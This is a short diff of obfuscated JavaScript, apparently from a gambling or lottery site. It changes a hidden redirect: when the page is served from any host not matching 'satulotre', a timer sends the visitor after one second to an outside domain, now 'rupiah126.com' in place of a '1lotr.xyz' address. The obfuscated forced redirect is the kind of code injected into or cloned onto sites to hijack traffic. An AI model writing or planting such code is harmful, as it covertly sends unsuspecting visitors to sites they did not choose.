@@ -443,7 +443,7 @@ function _0x1cc8() {
     const b = window.location.hostname;
     ["satulotre"].some((x) => b.includes(x)) ||
         setTimeout(function () {
-            window.location.href = "https://link01.1lotr.xyz/resmi1";
+            window.location.href = "https://rupiah126.com/mobile";
         }, 1e3);
 })(),
     (function (b, x) {
